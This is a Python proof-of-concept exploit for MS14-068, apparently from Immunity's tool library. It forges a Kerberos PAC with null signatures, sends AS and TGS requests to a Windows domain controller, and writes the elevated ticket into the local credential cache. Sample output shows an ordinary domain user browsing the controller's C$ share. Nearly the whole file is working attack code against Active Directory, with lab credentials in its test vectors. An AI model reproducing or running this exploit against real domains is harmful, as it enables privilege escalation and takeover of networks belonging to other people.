#!/usr/bin/env python
##ImmunityHeader v1
###############################################################################
## File       :  poc_ms14_068.py
## Description:
##            :
## Created_On :  Mon Dec  14 2014
## Created_By :  X.
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################

### PoC exploit for ms14-068
### Vulnerability exploited on a Windows 2003 R2 SP2 AD.
### No other version has been tested so far.

'''
$ kdestroy
$ ./libs/kerberos/poc_ms14_068.py
$ klist -f
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: jojo1@IMMU2.COM

Valid starting       Expires              Service principal
12/16/2014 18:53:31  12/17/2014 04:53:31  krbtgt/IMMU2.COM@IMMU2.COM
	renew until 12/23/2014 18:53:31, Flags: FPRA
$ smbclient //dc1.IMMU2.COM/C$ -k
OS=[Windows Server 2003 R2 3790 Service Pack 2] Server=[Windows Server 2003 R2 5.2]
smb: \> ls
  AUTOEXEC.BAT                        A        0  Sat Nov 22 08:54:09 2014
  boot.ini                          AHS      210  Sat Nov 22 08:51:43 2014
  CONFIG.SYS                          A        0  Sat Nov 22 08:54:09 2014
  Documents and Settings              D        0  Sat Nov 22 10:48:37 2014
  IO.SYS                           AHSR        0  Sat Nov 22 08:54:09 2014
  MSDOS.SYS                        AHSR        0  Sat Nov 22 08:54:09 2014
  MyServerSymbols                     D        0  Wed Nov 26 18:10:19 2014
  NTDETECT.COM                     AHSR    47772  Sun Feb 18 13:00:00 2007
  ntldr                            AHSR   297072  Sun Feb 18 13:00:00 2007
  pagefile.sys                      AHS 805306368  Wed Dec 10 16:25:56 2014
  Program Files                      DR        0  Wed Nov 26 11:49:00 2014
  RECYCLER                          DHS        0  Sun Nov 23 18:30:54 2014
  System Volume Information         DHS        0  Sun Nov 23 23:57:44 2014
  WINDOWS                             D        0  Sat Nov 29 03:17:38 2014
  wmpub                               D        0  Sat Nov 22 08:54:22 2014

		40950 blocks of size 1048576. 31269 blocks available
smb: \>
'''

import os
import sys
import socket
import struct
import logging
from datetime import datetime

if "." not in sys.path:
    sys.path.append(".")

import ticket
from protocol import AsReq, AsRep, TgsReq, TgsRep, Convert2PrincipalType
from pac import Pac, PacClientInfoIB, PacLogonInformationIB, PacSignatureDataIB
from filetimes import dt_to_filetime, utc
from libs.newsmb.libsmb import GetHostnameUsingSMB
import libs.newsmb.lsarpc as lsa
import libs.newsmb.libsmb as libsmb
import libs.kerberos.ccache as cc
import helper as helper

try:
    from pyasn1.codec.ber import encoder, decoder
except ImportError:
    logging.error("poc_ms14_068: Cannot import pyasn1 (required)")
    raise

test_vectors = [

    # RC4 encryption with a passphrase 
    { 'ip':'192.168.8.1',
      'port' : helper.KERBEROS_PORT,
      'domain': 'IMMU8.COM', 
      'user' : 'jojo1', 
      'passphrase' : 'foobar123!', 
      'salt': None,
      'cipher' : helper.ETYPE_ARCFOUR_HMAC_MD5,
      'protocol' : 'tcp' 
    },  # OK

]

def build_pac(vec, logon_time):

    pacobj = Pac()
    pacobj.set_header()

    dt = datetime.strptime(logon_time,'%Y%m%d%H%M%SZ')
    logon_time2 = dt_to_filetime(dt)
    user_sid = lsa.lsa_get_user_sid(vec['ip'],
                                    account_name=vec['user'],
                                    username=vec['user'],
                                    password=vec['passphrase'],
                                    domain=vec['domain'])

    if not user_sid:
        return None

    pacobj.add_info_buffer(1, PacLogonInformationIB({'user_name':vec['user'],
                                                     'user_sid':user_sid,
                                                     'domain_name':vec['domain'],
                                                     'logon_time':logon_time}))

    pacobj.add_info_buffer(10, PacClientInfoIB({'clientID':logon_time2,
                                            'name':vec['user'].encode('utf-16le'),
                                            'nameLength':len(vec['user'].encode('utf-16le'))}))

    sig_srv = [7, "\x00"*16 ]
    sig_kdc = [7, "\x00"*16 ]

    pacobj.add_info_buffer(6, PacSignatureDataIB({'type':sig_srv[0],
                                                  'data':sig_srv[1]}))

    pacobj.add_info_buffer(7, PacSignatureDataIB({'type':sig_kdc[0],
                                                  'data':sig_kdc[1]}))
    pac = pacobj.pack()
    #pacobj.show()
    return pac


###
# PART 1
###

def build_auth_file(vec):

    try:

        client_principal = Convert2PrincipalType(vec['user'], vec['domain'])
        auth_principal = Convert2PrincipalType('krbtgt/'+vec['domain'], vec['domain'])

        asreq = AsReq(client_principal, vec['domain'])
        asreq.set_server_principal(auth_principal)
        asreq.set_encryption_types([helper.ETYPE_ARCFOUR_HMAC_MD5])
        asreq.set_passphrase(vec['passphrase'], vec['salt'])
        asreq.set_pac_req_opt(False)
        frame = asreq.pack()

        k = helper.KerberosSocket(vec['ip'], use_tcp=vec['protocol']=='tcp')
        data = k.send(frame)
        if not data:
            logging.error("No answer!")
            return False

        resp = AsRep(data)
        if not resp.is_valid():
            logging.error("Invalid response or wrong status!")
            return False

        # Extract the ticket, session key, times struct and flags
        raw_ticket = resp.get_ticket()
        resp.set_passphrase(vec['passphrase'], vec['salt'])
        session_key = resp.get_session_key()
        authtime = resp.get_authtime().asOctets()
        pac = build_pac(vec, authtime)

        if not pac:
            logging.error("Could not build the PAC file")
            return False

        tgsreq = TgsReq(vec['domain'], client_principal=client_principal,
                                server_principal=auth_principal)
        tgsreq.set_ticket(raw_ticket)
        tgsreq.set_session_key(session_key)
        tgsreq.set_pac(pac)
        frame = tgsreq.pack()

        k = helper.KerberosSocket(vec['ip'], use_tcp=vec['protocol']=='tcp')
        data = k.send(frame)
        if not data:
            logging.error("No answer!")
            return False

        subkey = tgsreq.get_subkey()
        resp2 = TgsRep(data)
        if not resp2.is_valid():
            logging.error("Invalid response or wrong status!")
            return False

        resp2.set_key(subkey)

        # Extract the ticket, session key, times struct and flags
        raw_ticket2 = resp2.get_ticket()
        session_key2 = resp2.get_session_key()
        times2 = resp2.get_times()
        flags2 = resp2.get_flags()

        # Adds information to the CCache
        cc1 = cc.CCache()
        cc1.open('/tmp/krb5cc_' + str(os.getuid()), new=1)
        cc1.set_header(client_principal, vec['domain'])
        cc1.import_creds(client_principal,
                         auth_principal,
                         session_key2,
                         times2,
                         tktflags=flags2,
                         is_skey=0,
                         ticket=raw_ticket2)
        cc1.write()

    except Exception as e:
        logging.error("build_auth_file() failed: %s" % str(e))
        return False
    else:
        return True

###
# PART 2 - Exploiting it via samba :)
# (Something wrong: problem with case)
###

'''
# TODO: Fix the smb.dir() function which seems broken.
def do_smb(vec):

    sockaddr = (vec['ip'], 445)
    s = socket.socket()
    s.connect(sockaddr)
    smb = libsmb.SMBClient(s, vec['user'], 'xxx', vec['domain'])
    smb.is_unicode = True
    smb.max_smbfrag = 1
    smb.negotiate()
    smb.session_setup(kerberos_db='/tmp/krb5cc_' + str(os.getuid()), use_krb5=True)
    smb.tree_connect(u'C$')

    target_host = GetHostnameUsingSMB(vec['ip'])
    logging.info("=> Listing files on %s (%s)" % (vec['ip'], '.'.join([target_host,vec['domain']]).upper()))

    files = smb.dir(u'\\*')
    for f in files:
        logging.info(f['FileName'])

    smb.tree_disconnect()
    smb.logoff()
'''

###
# Main to test the class!
###

def main():

    for vec in test_vectors:
        ret = build_auth_file(vec)
        if not ret:
            logging.error("Failed!")
        else:
            logging.info("Success!")
            #do_smb(vec)

if __name__ == "__main__":
    main()
